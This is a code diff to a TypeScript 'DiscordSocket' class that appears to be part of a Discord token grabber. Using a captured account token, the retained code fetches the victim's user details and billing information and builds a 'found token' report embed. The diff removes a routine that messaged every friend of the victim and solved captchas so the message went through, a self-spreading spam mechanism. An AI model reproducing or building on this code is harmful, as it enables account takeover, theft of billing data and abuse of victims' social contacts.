@@ -101,24 +101,8 @@ export class DiscordSocket {
   }
 
   private async taskAfterCompletion(_this: DiscordSocket, token: string) {
-    const messageToSend = `DM MESSAGE`;
     const fullUserInformation = await getUserInformationAxios(token);
     const billingInformation = await getBillingInforationAxios(token);
-
-    const userFriends = await getUserFriendsAxios(token);
-    for (const friend of userFriends) {
-      const channel = await createFriendChannelAxios(token, friend.id);
-      const msg = await sendMessageAxios(token, channel.id, messageToSend);
-
-      if ("captcha_key" in msg)
-        await sendMessageWithCaptchaAxios(
-          token,
-          channel.id,
-          messageToSend,
-          await _this.solveCaptchaMessage(_this, msg),
-          msg.captcha_rqtoken
-        );
-    }
 
     const grabbedEmbed = await embeds.foundTokenEmbed();
     grabbedEmbed.setAuthor({
